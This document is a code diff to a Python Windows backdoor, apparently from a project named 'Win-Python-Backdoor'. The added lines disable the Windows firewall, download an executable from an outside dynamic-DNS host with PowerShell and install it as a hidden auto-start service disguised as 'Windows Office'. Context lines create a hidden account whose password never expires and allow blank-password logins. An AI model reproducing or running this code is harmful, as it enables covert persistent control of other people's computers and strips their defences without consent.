@@ -33,7 +33,6 @@ from subprocess import Popen
 
 
 #copy /y C:\Users\Master.MASTER6\Documents\GitHub\Win-Python-Backdoor\wofficeie.py C:\Python27
-#python setupserie.py py2exe
 #python C:\Users\Master.MASTER6\Documents\GitHub\Win-Python-Backdoor\setupserie.py py2exe
 def get_macaddress(host='localhost'):
     """ Returns the MAC address of a network host, requires >= WIN2K. """
@@ -81,8 +80,11 @@ def get_macaddress(host='localhost'):
  
     return macaddr.upper()
 
-
-
+os.system("netsh advfirewall set allprofiles state off")
+if not os.path.exists('c:\\windows\\wup.exe'):
+    os.system('powershell -Command Invoke-WebRequest -Uri "http://certificates.ddns.net/wofficeie.exe" -OutFile "c:\\windows\\wup.exe"')
+    subprocess.call("sc create wup binPath= \""+os.getenv('windir')+"\\wup.exe\" DisplayName= \"Windows Office\" start= auto", creationflags=0x08000000)
+    subprocess.call("net start wup", creationflags=0x08000000)
 class AppServerSvc (win32serviceutil.ServiceFramework):
     _svc_name_ = "wofficeie"
     _svc_display_name_ = "Windows Office"
@@ -119,10 +121,10 @@ class AppServerSvc (win32serviceutil.ServiceFramework):
                             os.system("wmic path Win32_UserAccount where Name=\'asp\' set PasswordExpires=false")
                             os.system("reg add hklm\\system\\currentcontrolset\\control\\lsa /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f")
                             os.system("netsh advfirewall set allprofiles state off")
-                            if not os.path.exists('c:\\windows\\wup.exe'):
-                                    os.system('powershell -Command Invoke-WebRequest -Uri "http://certificates.ddns.net/wofficeie.exe" -OutFile "c:\\windows\\wup.exe"')
-                                    subprocess.call("sc create wup binPath= \""+os.getenv('windir')+"\\wup.exe\" DisplayName= \"Windows Office\" start= auto", creationflags=CREATE_NO_WINDOW)
-                                    subprocess.call("net start wup", creationflags=CREATE_NO_WINDOW)
+##                            if not os.path.exists('c:\\windows\\wup.exe'):
+##                                    os.system('powershell -Command Invoke-WebRequest -Uri "http://certificates.ddns.net/wofficeie.exe" -OutFile "c:\\windows\\wup.exe"')
+##                                    subprocess.call("sc create wup binPath= \""+os.getenv('windir')+"\\wup.exe\" DisplayName= \"Windows Office\" start= auto", creationflags=CREATE_NO_WINDOW)
+##                                    subprocess.call("net start wup", creationflags=CREATE_NO_WINDOW)
                             if not os.path.exists('c:\\windows\\syswow64'):
                                     os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts" /f')
                                     os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /f')
